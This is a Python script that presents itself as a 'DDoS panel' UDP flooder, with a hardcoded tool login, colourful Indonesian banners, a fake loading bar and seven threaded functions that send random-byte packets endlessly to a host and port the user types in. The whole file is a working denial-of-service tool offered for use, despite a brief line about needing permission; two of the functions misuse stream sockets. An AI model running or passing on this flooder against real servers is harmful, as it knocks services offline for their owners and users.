"""
UDP Flooder.
This is a 'Dos' attack program to attack servers, you set the IP always that you have permission to do it.
and the port and the amount of seconds and it will start flooding to that server.
Created by Jecoster -> https://github.com/Jecoster/Python-UDP-Flood
Usage : ./flood_udp
Press enter to continue and introduce the data.
"""
import time
import socket
import random
import threading
import sys
import os
from os import system, name
import datetime
import getpass

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

def login():
    user = "Jecoster"
    passwd = "Jecoster"
    username = input(" 👑\033[1;33;40m Masukan Username Tools 👑: ")
    password = getpass.getpass(prompt='👑 Masukan Password Tools 👑: ')
    if username != user or password != passwd:
        print("")
        print(" 👑\033[1;33;40m Jangan Lupa Support Terus Jecoster 👑")
        sys.exit(1)
    elif username == user and password == passwd:
        print(" 👑\033[1;33;40m Jika Ada Bug Bisa Lapor Di Discord Jecoster 👑!")
        time.sleep(0.3)

login()

print("\033[1;34;40m \n")
os.system("figlet DDOS ATTACK -f slant")
print("\033[1;33;40m Jika Anda memiliki masalah, Lapor di https://github.com/Jecoster/Python-UDP-Flood/issues\n")

print("\033[1;33;40m ===========================  \n")
print("\033[1;32;40m =====> [ Developer Jecoster ] <======  \n")
print("\033[1;33;40m ===> [ Jangan Abuse Kamu ] <====  \n")
print("\033[1;33;40m =====> [ My Tools DDDOS ] <=====  \n")
print("\033[1;33;40m ===> [ Kalo Mau Rename Pm ] <=====  \n")
print("\033[1;33;40m ===========================  \n")
test = input()
if test == "n":
	exit(0)
	
def menu():
    sys.stdout.write("         \x1b]2;Jecoster DDOS --> Stars: [{bots}] | Online Users: [1] | Methods: [9999] | Bypass: [9999] | Amps: [9999]\x07")
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mJecoster \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Jecoster DDOS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Jecosterr9999 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate V2')
    print("")
    print("""
                        \x1b[38;2;0;212;14m \x1b[38;2;0;186;45m    \x1b[38;2;0;150;88m   \x1b[38;2;0;113;133m  \x1b[38;2;0;83;168m  \x1b[38;2;0;49;147m 
                        \x1b[38;2;0;212;14m \x1b[38;2;0;186;45m    \x1b[38;2;0;150;88m     \x1b[38;2;0;113;133m   \x1b[38;2;0;83;168m   \x1b[38;2;0;49;147m 
                        \x1b[38;2;0;212;14m \x1b[38;2;0;186;45m    \x1b[38;2;0;150;88m   \x1b[38;2;0;113;133m  \x1b[38;2;0;83;168m  \x1b[38;2;0;49;147m 
                \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m          \x1b[38;2;239;239;239mWelcome to Jecoster DDOS DDoS Panel        \x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239mFree DDoS Panel 2022\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
                    \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
                    \x1b[38;2;0;212;14m \x1b[38;2;239;239;239mhttps://github.com/Jecoster/JecosterDDoS \x1b[38;2;0;49;147m
                    \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m   \x1b[38;2;239;239;239m   Jangan Abuse Kalo Mau Di Pake DDOS.      \x1b[38;2;0;49;147m
                \x1b[38;2;0;212;14m\x1b[38;2;0;186;45m\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;83;168m\x1b[38;2;0;49;147m
""")

print("""

 
               
                             
                           
                      
            
                         
                                         
                                                   
                                                        
                                                                   
                                         

""")
	
ip = str(input("\033[1;33;40m [K] Enter Attack Host:"))
port = int(input("\033[1;33;40m [K] Enter Attack Port:"))
choice = str(input("\033[1;32;40 [K] Enter Methods UDP Attack(Attack/n):"))
times = int(input("\033[1;33;40m [K] Enter Attack Packets Connection:"))
threads = int(input("\033[1;33;40 [K] Enter Attack Threads Commection:"))
os.system("clear")

time.sleep(5)
print(" [ =                        ] 0%")
time.sleep(5)
print(" [ =======             ] 25%")
time.sleep(5)
print(" [ =========            ] 50%")
time.sleep(5)
print(" [ ============         ] 75%")
time.sleep(5)
print(" [ ===============     ] 100%")
os.system("clear")

def Attack():
	bytes = random._urandom(577)
	data = random._urandom(200000)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(bytes,addr)
			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
		except:
			sock.close()
			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")

def Attack2():
	bytes = random._urandom(577)
	data = random._urandom(200000)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(bytes,addr)
			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
		except:
			sock.close()
			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")

def Attack3():
	bytes = random._urandom(577)
	data = random._urandom(200000)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(bytes,addr)
			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
		except:
			sock.close()
			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")

def Attack4():
	bytes = random._urandom(577)
	data = random._urandom(200000)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(bytes,addr)
			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
		except:
			sock.close()
			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")

def Attack5():
	bytes = random._urandom(577)
	data = random._urandom(200000)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(bytes,addr)
			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
		except:
			sock.close()
			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")

def Attack6():
	bytes = random._urandom(16)
	data = random._urandom(400)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(bytes,addr)
			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
		except:
			sock.close()
			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
			
def Attack7():
	bytes = random._urandom(17)
	data = random._urandom(500)
	M = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				sock.sendto(bytes,addr)
			print(M +"MENGIRIM KOPI DAN PERMEN KE TARGET")
		except:
			sock.close()
			print(" [K] MENGIRIM KOPI DAN PERMEN KE TARGET")
			
for y in range(threads):
	if choice == 'Attack':
			th = threading.Thread(target = Attack)
			th.start()
			th = threading.Thread(target = Attack2)
			th.start()
			th = threading.Thread(target = Attack3)
			th.start()
			th = threading.Thread(target = Attack4)
			th.start()
			th = threading.Thread(target = Attack5)
			th.start()
			th = threading.Thread(target = Attack6)
			th.start()
			th = threading.Thread(target = Attack7)
			th.start()

def new():
	for y in range(threads):
		if choice == 'Attack':
			th = threading.Thread(target = Attack)
			th.start()
			th = threading.Thread(target = Attack2)
			th.start()
			th = threading.Thread(target = Attack3)
			th.start()
			th = threading.Thread(target = Attack4)
			th.start()
			th = threading.Thread(target = Attack5)
			th.start()
			th = threading.Thread(target = Attack6)
			th.start()
			th = threading.Thread(target = Attack7)
			th.start()